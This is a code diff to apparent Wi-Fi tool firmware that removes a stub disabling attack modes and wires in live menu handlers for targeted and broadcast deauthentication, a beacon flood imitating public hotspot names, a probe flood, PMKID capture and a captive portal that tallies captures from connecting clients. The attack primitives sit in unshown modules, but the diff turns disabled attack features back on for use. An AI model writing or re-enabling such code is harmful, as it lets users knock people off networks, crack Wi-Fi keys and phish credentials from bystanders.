@@ -38,6 +38,8 @@
 #include "src/packet_monitor.h"
 #include "src/system_tools.h"
 #include "src/bluetooth_tools.h"
+#include "src/wifi_attack.h"
+#include "src/captive_portal.h"
 
 // ============================================================================
 // Global State Variables
@@ -393,13 +395,239 @@ void executeSelectedMenuItem() {
             delay(2000);
             break;
 
-        // Attack/lab modes are intentionally removed from this build.
-        case SEC_DEAUTH_TARGET:
+        // === Security Testing ===
+        case SEC_DEAUTH_TARGET: {
+            int netCount = WiFiScanner::getNetworkCount();
+            if (netCount == 0) {
+                Display::displayInfo("Deauth Target", "No networks", "Run WiFi Scan first", "");
+                delay(2000);
+                break;
+            }
+            int target = 0;
+            Display::displayInfo("Deauth Target",
+                WiFiScanner::getNetwork(0)->ssid,
+                "1/" + String(netCount) + " UP/DN=select",
+                "SEL=start");
+            while (true) {
+                if (Input::isButtonPressed(BUTTON_UP)) {
+                    target = (target > 0) ? target - 1 : netCount - 1;
+                    Display::displayInfo("Deauth Target",
+                        WiFiScanner::getNetwork(target)->ssid,
+                        String(target + 1) + "/" + String(netCount) + " UP/DN=select",
+                        "SEL=start");
+                    nonBlockingDelay(200);
+                }
+                if (Input::isButtonPressed(BUTTON_DOWN)) {
+                    target = (target + 1) % netCount;
+                    Display::displayInfo("Deauth Target",
+                        WiFiScanner::getNetwork(target)->ssid,
+                        String(target + 1) + "/" + String(netCount) + " UP/DN=select",
+                        "SEL=start");
+                    nonBlockingDelay(200);
+                }
+                if (Input::isButtonPressed(BUTTON_SELECT)) { nonBlockingDelay(200); break; }
+                if (Terminal::stopRequested()) { Terminal::clearStopFlag(); return; }
+                yield();
+            }
+            currentState = STATE_SEC_DEAUTH_TARGET;
+            WiFiAttack::init();
+            WiFiAttack::startDeauthTargeted(target, 7);
+            Display::displayInfo("Deauth Target",
+                WiFiScanner::getNetwork(target)->ssid,
+                "Attacking...",
+                "SEL=stop");
+            while (!Terminal::stopRequested() && !Input::isButtonPressed(BUTTON_SELECT)) {
+                WiFiAttack::handleAttackLoop();
+                nonBlockingDelay(10);
+            }
+            WiFiAttack::stopAttack();
+            WiFiAttack::deinit();
+            Terminal::clearStopFlag();
+            currentState = STATE_MENU;
+            break;
+        }
+
         case SEC_DEAUTH_ALL:
-        case SEC_BEACON_FLOOD:
-        case SEC_PROBE_FLOOD:
-        case SEC_PMKID_CAPTURE:
-            SystemTools::disabledLabMode("Attack tools");
+            currentState = STATE_SEC_DEAUTH_ALL;
+            WiFiAttack::init();
+            WiFiAttack::startDeauthBroadcast(7);
+            Display::displayInfo("Deauth Broadcast", "Attacking all APs", "SEL=stop", "");
+            while (!Terminal::stopRequested() && !Input::isButtonPressed(BUTTON_SELECT)) {
+                WiFiAttack::handleAttackLoop();
+                nonBlockingDelay(10);
+            }
+            WiFiAttack::stopAttack();
+            WiFiAttack::deinit();
+            Terminal::clearStopFlag();
+            currentState = STATE_MENU;
+            break;
+
+        case SEC_BEACON_FLOOD: {
+            static const char* beaconSSIDs[] = {
+                "FreePublicWiFi", "xfinitywifi", "ATT_WiFi",
+                "CableWiFi", "Spectrum_WiFi", "_FREE_WIFI_",
+                "AndroidHotspot", "iPhone"
+            };
+            currentState = STATE_SEC_BEACON_FLOOD;
+            WiFiAttack::init();
+            WiFiAttack::startBeaconFlood(beaconSSIDs, 8);
+            Display::displayInfo("Beacon Flood", "Flooding 8 SSIDs", "SEL=stop", "");
+            while (!Terminal::stopRequested() && !Input::isButtonPressed(BUTTON_SELECT)) {
+                WiFiAttack::handleAttackLoop();
+                nonBlockingDelay(10);
+            }
+            WiFiAttack::stopAttack();
+            WiFiAttack::deinit();
+            Terminal::clearStopFlag();
+            currentState = STATE_MENU;
+            break;
+        }
+
+        case SEC_PROBE_FLOOD: {
+            const char* probeTarget = "CypherTest";
+            if (WiFiScanner::getNetworkCount() > 0) {
+                probeTarget = WiFiScanner::getNetwork(0)->ssid.c_str();
+            }
+            currentState = STATE_SEC_PROBE_FLOOD;
+            WiFiAttack::init();
+            WiFiAttack::startProbeFlood(probeTarget);
+            Display::displayInfo("Probe Flood", String(probeTarget), "Probing...", "SEL=stop");
+            while (!Terminal::stopRequested() && !Input::isButtonPressed(BUTTON_SELECT)) {
+                WiFiAttack::handleAttackLoop();
+                nonBlockingDelay(10);
+            }
+            WiFiAttack::stopAttack();
+            WiFiAttack::deinit();
+            Terminal::clearStopFlag();
+            currentState = STATE_MENU;
+            break;
+        }
+
+        case SEC_PMKID_CAPTURE: {
+            int netCount = WiFiScanner::getNetworkCount();
+            if (netCount == 0) {
+                Display::displayInfo("PMKID Capture", "No networks", "Run WiFi Scan first", "");
+                delay(2000);
+                break;
+            }
+            int target = 0;
+            Display::displayInfo("PMKID Capture",
+                WiFiScanner::getNetwork(0)->ssid,
+                "1/" + String(netCount) + " UP/DN=select",
+                "SEL=start");
+            while (true) {
+                if (Input::isButtonPressed(BUTTON_UP)) {
+                    target = (target > 0) ? target - 1 : netCount - 1;
+                    Display::displayInfo("PMKID Capture",
+                        WiFiScanner::getNetwork(target)->ssid,
+                        String(target + 1) + "/" + String(netCount) + " UP/DN=select",
+                        "SEL=start");
+                    nonBlockingDelay(200);
+                }
+                if (Input::isButtonPressed(BUTTON_DOWN)) {
+                    target = (target + 1) % netCount;
+                    Display::displayInfo("PMKID Capture",
+                        WiFiScanner::getNetwork(target)->ssid,
+                        String(target + 1) + "/" + String(netCount) + " UP/DN=select",
+                        "SEL=start");
+                    nonBlockingDelay(200);
+                }
+                if (Input::isButtonPressed(BUTTON_SELECT)) { nonBlockingDelay(200); break; }
+                if (Terminal::stopRequested()) { Terminal::clearStopFlag(); return; }
+                yield();
+            }
+            currentState = STATE_SEC_PMKID_CAPTURE;
+            WiFiAttack::init();
+            WiFiAttack::startPMKIDCapture(target);
+            Display::displayInfo("PMKID Capture",
+                WiFiScanner::getNetwork(target)->ssid,
+                "Listening... (2min)",
+                "SEL=stop");
+            while (!Terminal::stopRequested() && !Input::isButtonPressed(BUTTON_SELECT)) {
+                WiFiAttack::handleAttackLoop();
+                if (!WiFiAttack::isAttacking()) break;
+                nonBlockingDelay(100);
+            }
+            WiFiAttack::stopAttack();
+            WiFiAttack::deinit();
+            Terminal::clearStopFlag();
+            currentState = STATE_MENU;
+            break;
+        }
+
+        // === Captive Portal ===
+        case CAPTIVE_PORTAL: {
+            if (StarbeamWebServer::isRunning()) {
+                StarbeamWebServer::stop();
+                WiFiScanner::deinit();
+            }
+            int tmplIdx = 0;
+            int total = CaptivePortal::getTemplateCount();
+            Display::displayInfo("Captive Portal",
+                String(CaptivePortal::getTemplateName(0)),
+                "1/" + String(total) + " UP/DN=select",
+                "SEL=start");
+            while (true) {
+                if (Input::isButtonPressed(BUTTON_UP)) {
+                    tmplIdx = (tmplIdx > 0) ? tmplIdx - 1 : total - 1;
+                    Display::displayInfo("Captive Portal",
+                        String(CaptivePortal::getTemplateName(tmplIdx)),
+                        String(tmplIdx + 1) + "/" + String(total) + " UP/DN=select",
+                        "SEL=start");
+                    nonBlockingDelay(200);
+                }
+                if (Input::isButtonPressed(BUTTON_DOWN)) {
+                    tmplIdx = (tmplIdx + 1) % total;
+                    Display::displayInfo("Captive Portal",
+                        String(CaptivePortal::getTemplateName(tmplIdx)),
+                        String(tmplIdx + 1) + "/" + String(total) + " UP/DN=select",
+                        "SEL=start");
+                    nonBlockingDelay(200);
+                }
+                if (Input::isButtonPressed(BUTTON_SELECT)) { nonBlockingDelay(200); break; }
+                if (Terminal::stopRequested()) { Terminal::clearStopFlag(); return; }
+                yield();
+            }
+            currentState = STATE_CAPTIVE_PORTAL;
+            CaptivePortal::init();
+            CaptivePortal::start(tmplIdx);
+            unsigned long lastOled = 0;
+            while (!Terminal::stopRequested() && !Input::isButtonPressed(BUTTON_SELECT)) {
+                CaptivePortal::handleClient();
+                if (millis() - lastOled > 2000) {
+                    Display::displayInfo(
+                        CaptivePortal::getActiveSSID(),
+                        "Clients: " + String(CaptivePortal::getConnectedClients()),
+                        "Captures: " + String(CaptivePortal::getCaptureCount()),
+                        "SEL=stop");
+                    lastOled = millis();
+                }
+                yield();
+            }
+            CaptivePortal::stop();
+            CaptivePortal::deinit();
+            Terminal::clearStopFlag();
+            currentState = STATE_MENU;
+            break;
+        }
+
+        case CAPTIVE_PORTAL_OFF:
+            if (CaptivePortal::isRunning()) {
+                CaptivePortal::stop();
+                CaptivePortal::deinit();
+                Display::displayInfo("C-Portal", "Stopped", "", "");
+            } else {
+                Display::displayInfo("C-Portal", "Not running", "", "");
+            }
+            delay(1500);
+            break;
+
+        case CAPTIVE_PORTAL_STATUS:
+            Display::displayInfo("C-Portal Status",
+                CaptivePortal::isRunning() ? "RUNNING" : "STOPPED",
+                "Captures: " + String(CaptivePortal::getCaptureCount()),
+                "Clients: " + String(CaptivePortal::getConnectedClients()));
+            delay(3000);
             break;
 
         // Utility
